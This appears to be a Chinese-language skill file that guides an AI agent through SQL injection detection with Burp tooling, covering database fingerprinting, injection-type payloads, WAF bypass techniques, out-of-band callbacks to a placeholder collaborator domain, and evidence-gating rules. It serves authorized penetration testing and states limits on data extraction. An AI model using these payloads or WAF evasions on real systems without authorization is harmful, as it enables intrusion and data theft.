# SQLi Detection Engine — Phase 0-5 + WAF Bypass Matrix
# 被调用方: AI-10（SQLi深度检测）
# 加载时机: AI-10 触发时读取本文件，不在 SKILL.md 内联

---

## 前置：五条件门控（AI-3 最终确认点）

> **任何 SQLi 标记 CONFIRMED 前，五条件必须全部满足。缺一不得标记 CONFIRMED；根据缺口大小保留为 PROBABLE 或 HYPOTHESIS。**

```
① 注入点存在        — 参数值被拼入SQL查询的证据（错误信息/响应语义变化）
② 直接拼接          — 无参数化查询迹象（PreparedStatement/参数化API）
③ 响应差异          — 注入前后响应有统计显著差异（内容/时延/状态码）
④ 可重现            — 同一 payload 独立发包 ≥2次，结果一致
⑤ 排除假阳性        — FP Gate Rule 1/2/3 均未命中
```

时延特别规则：`time-based` 必须 **2次独立发包** 均超阈值（防网络抖动误判）。单次超时 = Rule 3 触发 = FP。

---

## Phase 0：数据库指纹识别

### 0A. 探针 payload（按顺序发送）

```
探针集（发送顺序: 从低噪到高噪）:
  P1 (单引号):    '
  P2 (双引号):    "
  P3 (注释符):    --  #  /**/
  P4 (括号):      )  ')  "))
  P5 (布尔探针):  ' AND '1'='1  vs  ' AND '1'='2
  P6 (时延探针):  ' AND SLEEP(0)--  (基线)
```

### 0B. 错误信息 → DB类型映射

| 错误特征 | 数据库 | 置信度 |
|---------|--------|:------:|
| `You have an error in your SQL syntax` | MySQL | 高 |
| `Warning: mysql_` | MySQL (PHP) | 高 |
| `ERROR: unterminated quoted string` | PostgreSQL | 高 |
| `PG::SyntaxError` | PostgreSQL | 高 |
| `ORA-00933` / `ORA-00907` | Oracle | 高 |
| `Unclosed quotation mark` | MSSQL | 高 |
| `Microsoft OLE DB Provider` | MSSQL | 高 |
| `SQLite3::Exception` / `sqlite3.OperationalError` | SQLite | 高 |
| `SQLSTATE[42000]` | 通用PDO | 中（需进一步区分） |
| HTTP 500 无错误详情 | 未知 | 低（切换盲注） |

### 0C. 无错误时的指纹推断（侧信道）

```
1. 版本函数探针（UNION/布尔注入后）:
   MySQL:      SELECT @@version
   PostgreSQL: SELECT version()
   MSSQL:      SELECT @@version
   Oracle:     SELECT banner FROM v$version WHERE rownum=1
   SQLite:     SELECT sqlite_version()

2. 函数行为差异:
   SLEEP(5)   → MySQL
   pg_sleep(5) → PostgreSQL
   WAITFOR DELAY '0:0:5' → MSSQL
   dbms_pipe.receive_message('x',5) → Oracle

3. 字符串拼接方式:
   MySQL:       CONCAT('a','b')  或  'a' 'b'
   MSSQL:       'a'+'b'
   Oracle:      'a'||'b'
   PostgreSQL:  'a'||'b'
```

---

## Phase 1：注入类型判定

### 1A. Error-based（有回显错误信息）

```
适用: DB返回可见错误信息

MySQL extractvalue（最常用）:
  ' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--
  → 响应含: XPATH syntax error: '~8.0.xx'

MySQL updatexml:
  ' AND updatexml(1,concat(0x7e,(SELECT database())),1)--

MSSQL convert:
  ' AND 1=convert(int,(SELECT @@version))--

PostgreSQL cast:
  ' AND CAST((SELECT version()) AS int)--

Oracle XMLType:
  ' AND 1=XMLType('<x>'||(SELECT banner FROM v$version WHERE rownum=1)||'</x>')--

提取序列（按需递进）:
  1. SELECT @@version / version()   — DB版本
  2. SELECT database() / current_database()  — 当前库名
  3. SELECT user() / current_user  — 当前DB用户
  ⚠️ 仅提取以上3项作为危害证明，不深挖业务数据
```

### 1B. Boolean-based（响应内容差异）

```
基础探针对（必须形成明确对比）:
  True:   ' AND 1=1--    或  ' AND 'a'='a
  False:  ' AND 1=2--    或  ' AND 'a'='b

判定标准:
  - True响应 与 False响应 内容/长度有稳定差异 → 可用
  - 两者完全相同 → FP Gate Rule 1 → 不可用

高级布尔技术:
  SUBSTRING提取（逐字符）:
    ' AND SUBSTRING((SELECT database()),1,1)='a'--
    → 配合 Intruder Cluster Bomb + 字符集枚举

  盲注自动化:
    使用 send_to_intruder 配置:
      Position: SUBSTRING(...,§pos§,1)='§char§'
      Payload 1: 1-30 (位置)
      Payload 2: a-z,0-9,_,- (字符)
    响应长度差异列作为命中标记
```

### 1C. Time-based（无内容差异，依赖时延）

```
基础时延探针（必须2次独立验证）:
  MySQL:       ' AND SLEEP(5)--
  PostgreSQL:  ' AND pg_sleep(5)--
  MSSQL:       '; WAITFOR DELAY '0:0:5'--
  Oracle:      ' AND 1=dbms_pipe.receive_message('x',5)--
  SQLite:      无原生sleep，使用 randomblob(1000000000)

验证协议（2次独立发包）:
  发包1: 含SLEEP(5) payload → 记录响应时间 t1
  基线:  不含payload → 记录基线时间 t0
  发包2: 重复含SLEEP(5) payload → 记录响应时间 t2
  判定:
    (t1 - t0 > 4s) AND (t2 - t0 > 4s) → ✅ CONFIRMED
    仅单次超阈值 → FP Gate Rule 3 → ⚠️ HYPOTHESIS

时延提取（Stacked Queries / 条件时延）:
  ' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(3), 0)--
  → 字符匹配时延迟3s，用于数据提取
```

### 1D. Union-based（可合并查询结果）

```
步骤1: 确定列数（ORDER BY二分法）
  ' ORDER BY 1--  → 正常
  ' ORDER BY 5--  → 正常
  ' ORDER BY 10-- → 错误
  → 二分缩小范围，确定列数N

步骤2: 确定回显位置
  ' UNION SELECT NULL,NULL,NULL-- (N个NULL)
  逐步替换NULL为字符串: ' UNION SELECT 'a',NULL,NULL--
  → 观察'a'出现在响应的哪个位置

步骤3: 数据提取
  ' UNION SELECT @@version,NULL,NULL--
  (回显位置对应填入SELECT语句)

注意: UNION需要列数/数据类型匹配，类型不匹配时用NULL占位
```

### 1E. OOB（Out-of-Band，盲注最优解）

```
MySQL（需FILE权限）:
  ' UNION SELECT LOAD_FILE(CONCAT('\\\\',database(),'.','{collaborator_domain}\\a'))--

MSSQL（需xp_dirtree）:
  '; exec master..xp_dirtree '//{collaborator_domain}/a'--

PostgreSQL（需COPY权限）:
  '; COPY (SELECT '') TO PROGRAM 'nslookup {collaborator_domain}'--

Oracle（需UTL_HTTP/UTL_DNS）:
  ' UNION SELECT UTL_HTTP.REQUEST('http://{collaborator_domain}') FROM dual--

使用 Burp Collaborator:
  payload_id = generate_collaborator_payload(customData=VULN_ID)
  注入后等待15s
  interactions = get_collaborator_interactions(payloadId=payload_id)
  有DNS/HTTP回调 → ✅ CONFIRMED（记录 collaborator_interaction_id）
```

---

## Phase 2：WAF检测与绕过策略

### 2A. WAF检测信号

```
状态码:
  403 Forbidden      → 规则命中
  406 Not Acceptable → 内容过滤
  413 Too Large      → 请求大小限制
  429 Too Many Req   → 频率限制

响应体关键词:
  "blocked" / "forbidden" / "detected" / "threat"
  "非法" / "拦截" / "安全验证" / "waf"

响应头:
  X-Sucuri-ID / CF-RAY / X-Powered-By-Akamai
  Server: cloudflare / yunjiasu-nginx / NAXSI
```

### 2B. WAF指纹 → 绕过策略映射

| WAF指纹 | 优先绕过策略 | 备注 |
|---------|------------|------|
| Cloudflare | HTTP/2降级 + Unicode全角 | CF对HTTP/2规则较弱 |
| 阿里云WAF | GBK宽字节（中文目标）+ 分块传输 | 对编码敏感 |
| AWS WAF | 大小写混淆 + 注释插入 | 基于规则集 |
| 腾讯WAF | 双重URL编码 + 参数污染 | |
| ModSecurity(OWASP) | 空字节插入 + 注释变体 | 规则集公开可研究 |
| 自研WAF（中文错误页） | 测试所有Level，记录突破点 | 规则通常较简单 |

### 2C. 绕过技术库（按成功率排序）

```
Level 1 — 基础变形（成功率：高，被检测率：低）
  大小写混淆:   SeLeCt / WheRe / UnIoN
  注释插入:     SEL/**/ECT / UN/*comment*/ION
  空白符变体:   \t \n %09 %0a %0d 替代空格
  URL编码:      %27 = ' / %20 = space / %2B = +

Level 2 — 中级绕过（成功率：中，需测试）
  双重编码:     %2527 = %27 = '
  HTML实体:     &#39; = '（仅部分场景）
  负数绕过:     1 UNION SELECT → -1 UNION SELECT
  内联注释:     /*!UNION*/ /*!SELECT*/（MySQL专用）
  参数污染:     ?id=1&id=2' 双参数注入

Level 3 — 高级绕过（成功率：中，对抗强WAF）
  HTTP/2:      使用 send_http2_request 降级传输
  分块传输:    Transfer-Encoding: chunked + 分块body
  Content-Type swap: 将POST body改为multipart/form-data
  边界注入:    multipart boundary中嵌入payload

Level 4 — 特殊场景（针对特定目标）
  GBK宽字节:   %df%27 → 吃掉反斜杠（中文GBK环境）
  UTF-8截断:   %c0%27 / %e0%80%27（部分旧版解析器）
  Null字节:    %00 截断后续内容
  Base64嵌套:  参数被base64解码后注入
```

---

## Phase 3：数据提取（CONFIRMED后，仅证明危害）

> ⚠️ 仅提取以下3类信息作为危害证明，**禁止提取业务数据（用户表/交易记录）**

```
允许提取（危害证明最小集）:
  1. DB版本信息:  SELECT @@version / version() / sqlite_version()
  2. 当前DB用户:  SELECT user() / current_user / SESSION_USER
  3. 当前库名:    SELECT database() / current_database() / db_name()

提取方法（根据注入类型选择）:
  Error-based  → 直接在错误信息中读取（Phase 1A）
  Union-based  → UNION SELECT [target],NULL,NULL--
  Boolean-based → SUBSTRING逐字符提取（慢但可靠）
  Time-based   → IF(SUBSTR(user(),1,1)='r',SLEEP(3),0) 字符验证
  OOB          → load_file/xp_dirtree DNS外带（最快）

提取完成后输出:
  DB_VERSION: MySQL 8.0.32
  DB_USER: webapp@localhost
  DB_NAME: production_db
  → 写入 finding.evidence，危害等级依据此信息评定
```

---

## Phase 4：二阶注入检测

> 与 code-audit SECOND_ORDER_TAINT 联动（burp执行动态部分）

```
二阶注入特征:
  - 存储端点：接受并保存用户输入（无立即危害）
  - 读取端点：读取并使用已存储数据（触发点）
  - 危害发生在读取，不在存储

检测步骤:
  1. 在存储端点写入 payload（不触发告警的形式）:
     username: admin'--
     注意：存储时可能被显示转义，但DB存储层未转义

  2. 触发读取端点（使用存储的数据）:
     典型场景：
     - 注册用户名后，登录时触发查询
     - 提交评论后，管理员查看时触发
     - 上传文件名后，生成列表时触发

  3. 观察读取端点响应 → AI-3判定（同Phase 1规则）

  4. 联动 code-audit [HYPOTHESIS_INQUIRY]（QUESTION_TYPE: CALL_CHAIN）:
     询问: "存储端 ClassName::save() → 读取端 ClassName::render() 的完整调用链"
     依据回应修正测试策略
```

---

## Phase 5：五条件最终确认（AI-3 调用点）

```
[五条件最终核查清单]

□ ① 注入点确认
  - 有错误信息显示SQL语法 → ✅
  - 有布尔响应差异 → ✅
  - 有时延差异（2次验证） → ✅
  - 有OOB回调 → ✅

□ ② 直接拼接证据
  - 错误信息包含注入的引号/关键词 → ✅
  - code-audit 确认无参数化（来自 CHAIN_CLARIFICATION）→ ✅
  - 无参数化迹象（PreparedStatement/parameterized query）→ ✅

□ ③ 响应差异统计显著
  - 布尔差异：True/False响应长度差 > 10字节 → ✅
  - 时延差异：两次均超阈值4s → ✅
  - 错误信息含注入内容 → ✅

□ ④ 可重现
  - 相同payload独立发包 ≥2次，结果一致 → ✅

□ ⑤ 假阳性排除
  - FP Gate Rule 1 (响应一致性) → 未命中 ✅
  - FP Gate Rule 2 (随机性) → 未命中 ✅
  - FP Gate Rule 3 (时延抖动/单次) → 未命中 ✅

全部 ✅ → AI-3 输出 CONFIRMED
E1-E3 已闭合但 E4/E5 仍有关键缺口 → AI-3 输出 PROBABLE
其余缺口较大 → AI-3 输出 HYPOTHESIS + 说明缺失条件
```

---

## 快速参考：各DB常用 Payload 速查

### MySQL
```sql
-- 版本
' UNION SELECT @@version,NULL--
' AND extractvalue(1,concat(0x7e,@@version))--
-- 时延
' AND SLEEP(5)--
-- 布尔
' AND 1=1-- (true) / ' AND 1=2-- (false)
-- 列枚举
' ORDER BY 10--
```

### PostgreSQL
```sql
-- 版本
' UNION SELECT version(),NULL--
' AND 1=CAST(version() AS int)--
-- 时延
' AND pg_sleep(5)--
-- 布尔
' AND 'a'='a-- (true) / ' AND 'a'='b-- (false)
```

### MSSQL
```sql
-- 版本
' UNION SELECT @@version,NULL--
' AND 1=CONVERT(int,@@version)--
-- 时延
'; WAITFOR DELAY '0:0:5'--
-- 堆叠查询（若支持）
'; SELECT 1--
```

### Oracle
```sql
-- 版本（注意FROM dual）
' UNION SELECT banner,NULL FROM v$version WHERE rownum=1--
-- 时延（需权限）
' AND 1=dbms_pipe.receive_message('x',5)--
-- 行数限制
WHERE rownum=1
```

### SQLite
```sql
-- 版本
' UNION SELECT sqlite_version(),NULL--
-- 无SLEEP，使用CPU密集函数
' AND 1=(SELECT COUNT(*) FROM sqlite_master t1,sqlite_master t2)--
```

---

## 与 code-audit 联动触发点

```
AI-10 在以下时机向 code-audit 发出信号:

1. Phase 0 完成: 确定DB类型 → 更新 JOINT_SESSION.surface_map[endpoint].db_type
2. Phase 4 (二阶注入): 发出 [HYPOTHESIS_INQUIRY](QUESTION_TYPE: CALL_CHAIN)
3. Phase 5 CONFIRMED/PROBABLE: 发出 [BACKFILL_COMPLETE] 或对应 writeback → 更新 burp_evidence + dktss_delta
4. 发现WAF: 输出 [WAF_BYPASS_LEARNED] 供 code-audit PoC生成参考

反向: code-audit 可通过 [CHAIN_CLARIFICATION] 提供:
  - SQL拼接位置的精确代码行
  - 参数化查询的缺失路径
  - 二阶注入的存储/读取端点配对
```
